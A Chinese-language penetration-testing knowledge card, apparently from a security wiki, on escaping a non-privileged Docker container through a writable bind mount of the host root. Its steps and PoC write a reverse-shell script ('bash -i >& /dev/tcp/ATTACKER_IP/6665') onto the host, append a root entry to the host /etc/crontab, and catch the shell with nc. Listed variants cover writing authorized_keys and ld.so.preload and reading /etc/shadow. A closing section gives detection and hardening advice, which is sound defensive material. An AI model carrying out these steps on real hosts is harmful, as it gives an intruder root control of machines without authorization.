---
id: cloud-container-host-dir-bind-mount-etc-crontab-escape
title: 非特权容器误挂宿主机目录（df -h 可见 /dev/xxx 下整套宿主文件树）：直接改写宿主机 /etc/crontab 定时任务逃逸
type: scenario
domain: cloud
path: cloud/container
technique: container-host-dir-bind-mount-crontab-escape
aliases:
- 容器挂载宿主机目录逃逸
- bind mount 容器逃逸
- 宿主机 crontab 逃逸
- df -h 识别宿主机挂载
- 非特权容器逃逸
- /etc/crontab 写反弹 shell
- volume 挂载配置错误
tags:
- docker
- container
- escape
- bind-mount
- crontab
- volume
- misconfiguration
- linux
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W2
  verified_at: '2026-11-08T12:02:25+08:00'
  notes: 已对照原文核对：df -h 中出现 /dev/sda5 指向 /dev/tmp 以及 /etc/hosts 等宿主专有挂载点、touch/chmod 脚本落到 /dev/tmp/tmp、sed -i 追加 */1 * * * * root /tmp/test.sh 到 /dev/tmp/etc/crontab、随后收到宿主 root 反弹 shell（id uid=0 且主机名 wty-virtual-machine/ip a 为宿主网段）均与原文一致；无需 privileged/capability，属挂载配置类场景，不设 affected_versions 正确；未混入 sources/source_url/文章ID/URL。未验证点：未复现该容器环境。
---

## 一句话结论

容器不需要 `--privileged`、不需要 `CAP_SYS_ADMIN`、也不需要挂载 docker.sock：只要启动时把宿主机目录（尤其是宿主机根 `/`）以 bind mount/volume 方式挂进容器且容器内可写，`df -h` 就会把宿主机文件树暴露成一串 `/dev/xxx` 挂载点（形如 `/dev/sda5 ... /dev/tmp/etc/hosts`），此时容器内进程可直接改写挂载点下的宿主机 `/etc/crontab` 追加一条 `root` 定时任务，等待宿主 cron 触发反弹 shell 即可拿到宿主机 root。

## 原理

- **bind mount 不改变权限模型，只共享目录**：`docker run -v /:/host`（或 compose 的 `volumes: - /data:/data`）把宿主机目录树映射进容器。容器内的文件读写在宿主机上就是同一份 inode，容器内 root（默认 uid 0，未启用 user namespace 映射）对可写挂载点拥有宿主 root 的写权限。因此这不是“逃逸漏洞”，而是挂载配置把隔离边界直接抹掉了。
- **为什么 `df -h` 是关键识别手段**：正常容器只会看到 `overlay /`、`tmpfs /dev`、`tmpfs /sys/fs/cgroup`、`shm /dev/shm` 少数几项。一旦宿主机目录被 bind mount，`df -h` 会出现大量 `设备 ... 挂载点` 行指向宿主机的块设备（如 `/dev/sda5`、`/dev/sda1`、`/dev/loopN`），挂载点路径里出现 `/etc/hosts`、`/etc/hostname`、`/etc/resolv.conf`、`/boot/efi`、`/var/lib/docker/overlay2/.../merged` 这类只可能属于宿主的路径。这些行本身就是“宿主文件树已可写”的直接证据，比盲目猜 `/host`、`/mnt` 更可靠。
- **改写 `/etc/crontab` 为什么以 root 执行**：`/etc/crontab` 是系统级 crontab，格式比用户 crontab 多一个“运行用户”字段（`分 时 日 月 周 用户 命令`）。追加 `*/1 * * * * root bash /tmp/test.sh` 后，cron 守护进程每分钟以 root 执行该脚本；脚本内容只需一条 `bash -i >& /dev/tcp/<ip>/<port> 0>&1` 即可回连。因为写的是宿主机文件，触发也在宿主机命名空间，得到的是宿主 shell 而不是容器 shell。
- **为什么脚本常放在挂载点内的 `/tmp`**：crontab 里的命令由宿主 cron 在自己命名空间执行，因此脚本路径必须是**宿主机视角**存在的路径。把脚本写到挂载点下（容器内看到的 `/dev/tmp/tmp/test.sh`，宿主视角是 `/tmp/test.sh`）即可两边一致；同时该目录通常可写且不易被业务清理。
- **为什么不用特权逃逸那一套**：不需要 `mount`、`fdisk`、`chroot`，也不依赖内核漏洞。判断只需两条：容器内可写某个指向宿主路径的挂载点 + 宿主 cron 在跑。代价是触发有分钟级延迟、依赖 cron 服务；如果 cron 不可用，改 `authorized_keys`、systemd unit、`/etc/profile.d` 等任何宿主可执行点都同理。
- **前置条件**：容器内获得命令执行（WebShell/RCE）；挂载点对容器内进程可写；宿主机 cron 服务运行；容器内能看到该挂载点（权限位 755/777 均可，root 写入不受影响）。

## 触发条件

- 已获得容器内命令执行（WebShell、应用 RCE、CI job 等）。
- 容器以 root 运行（Docker 默认），或挂载点属主允许当前用户写。
- 启动参数/compose 中存在宿主目录 bind mount，且挂载点不是只读（未见 `:ro`）。
- 宿主机 cron 服务启用并会加载 `/etc/crontab`（Debian/Ubuntu 默认由 cron 读取该文件；也可改写 `/etc/cron.d/*`）。
- 攻击者能从容器访问回连目标（出网或经代理）。

## 利用步骤

1. **确认在容器内**：`cat /proc/1/cgroup`、`ls /.dockerenv`、`hostname` 与业务主机名不符等特征。
2. **枚举挂载**：`df -h`（重点）/ `mount` / `cat /proc/self/mountinfo`。寻找挂载点路径中出现宿主专有路径（`/etc/hosts`、`/boot/efi`、`/var/lib/docker/overlay2/*/merged`）的行，记录对应容器内路径（本例为 `/dev/tmp`）。
3. **验证可写且确实是宿主**：在挂载点下 `ls`、对比 `cat <挂载点>/etc/hostname` 与容器 hostname；尝试创建测试文件（`touch <挂载点>/tmp/xxx`）确认写入成功、且宿主视角路径存在。
4. **准备回连脚本**：在挂载点的 `/tmp` 下写脚本，内容为反弹 shell（`bash -i >& /dev/tcp/IP/PORT 0>&1`），`chmod 777`。
5. **改写宿主 crontab**：向 `<挂载点>/etc/crontab` 追加 `*/1 * * * * root /tmp/test.sh`（注意必须是宿主视角路径），`cat` 回读确认写入。
6. **等待触发**：在攻击端监听对应端口；宿主 cron 下一分钟执行脚本，得到宿主 root 反弹 shell（`id` 应为 `uid=0(root)`）。
7. **验证与清理**：确认 `hostname`/`ip a` 属于宿主（会出现 docker0、多个网段、业务网卡），而非容器；测试结束后删除 crontab 行与脚本。

## PoC

识别宿主挂载（输出节选，重点是挂载点里出现宿主路径）：

```bash
df -h
# overlay  195G ... /
# tmpfs     64M ... /dev
# /dev/sda5 195G ... /dev/tmp
# /dev/sda5 195G ... /etc/hosts
# /dev/sda1 511M ... /dev/tmp/boot/efi
# overlay   195G ... /dev/tmp/var/lib/docker/overlay2/<id>/merged
```

写入宿主定时任务：

```bash
# 容器内视角：/dev/tmp 是宿主根目录的 bind mount
mkdir -p /dev/tmp/tmp
cat > /dev/tmp/tmp/test.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/6665 0>&1
EOF
chmod 777 /dev/tmp/tmp/test.sh

# /etc/crontab 多一个“用户”字段，必须以 root 指定执行身份
sed -i '$a*/1 * * * * root /tmp/test.sh' /dev/tmp/etc/crontab
cat /dev/tmp/etc/crontab
```

攻击端：

```bash
nc -lvnp 6665
# 约 1 分钟后收到宿主 root 的交互 shell
```

## 变体与关联

- **挂载点名称变体**：不一定叫 `/host`；常见还有 `/data`、`/mnt`、`/opt`、`/dev/tmp`，甚至 `/etc/hosts`、`/etc/resolv.conf` 这类单文件挂载（单文件挂载只能改该文件，价值较低，除非改 `/etc/ld.so.preload`、`/root/.ssh/authorized_keys`）。
- **持久化点变体**：`/etc/cron.d/*`（免“用户”字段也可以，格式同样是系统级）、`/var/spool/cron/crontabs/root`（Ubuntu）、`/var/spool/cron/root`（CentOS）、`/root/.ssh/authorized_keys`、`/etc/systemd/system/*.service`、`/etc/profile.d/*.sh`、`/etc/ld.so.preload`。
- **只读挂载变体**：`:ro` 时不能直接写；但仍可读取宿主机文件（如 `/etc/shadow`、宿主 SSH 私钥、其他容器配置）做凭据收集，再转其它路径。
- **无 root 变体**：容器以非 root 运行但挂载点属主恰好可写（如宿主目录属主 UID 与容器用户一致）时同样成立；此时写宿主文件仍会以宿主 cron 的 root 执行。
- 关联：[[cloud-container-docker-privileged-host-disk-escape]]（需要 `--privileged` + 自行 `mount` 磁盘，本卡不需要任何额外 capability，差别在“挂载从哪来”）。
- 关联：[[cloud-container-docker-socket-tcp-escape]]（有 docker.sock 时可用 `docker run -v /:/host` 自己造这个挂载；本卡是挂载已存在）。
- 关联：[[cloud-container-docker-host-procfs-mount-write-authorized-keys]]（挂载 `/proc` 指向宿主命名空间，属同类“挂载配置错误”）。
- 关联：[[pentest-persistence-linux-cron-reverse-shell]]、[[pentest-privilege-escalation-cron-writable-script]]（cron 反弹 shell 与定时任务写入的通用形态）。
- 边界：宿主 cron 未运行、挂载全部只读、或容器启用 user namespace 且挂载点权限被收紧时不成立；`sed -i` 需要目标文件与临时目录可写。

## 检测与防御

- 检测（宿主视角）：容器内对 `/etc/crontab`、`/etc/cron.d/*`、`/var/spool/cron/*`、`authorized_keys` 的写入；容器进程出现 `df -h`、`mount`、`cat /proc/self/mountinfo`、`find / -name crontab` 等侦察命令；启动即反弹的出站连接在整分钟边界触发。
- 检测：容器启动参数/compose 中出现 `-v /:/...`、`-v /etc:/...`、`--mount source=/,...` 且未带 `:ro`；k8s 中 `hostPath: /`（这是最危险的一种）。
- 防御：**默认不加宿主目录挂载**；确需共享时只挂具体子目录、加 `:ro`、并以最小权限运行；不要挂 `/`、`/etc`、`/proc`、`/sys`、`/var/run`。
- 防御：启用 user namespace remapping（`userns-remap`）让容器内 root 不映射为宿主 root；对挂载点用只读 + 独立 UID。
- 防御：宿主 cron 配置与关键文件纳入 FIM/完整性监控；对容器逃逸类行为做 EDR 规则（容器进程写宿主机路径）。
- 防御：容器内不保留 `df`/`mount` 等侦察工具只是降低效率，不能阻止；核心是挂载配置本身的最小化。
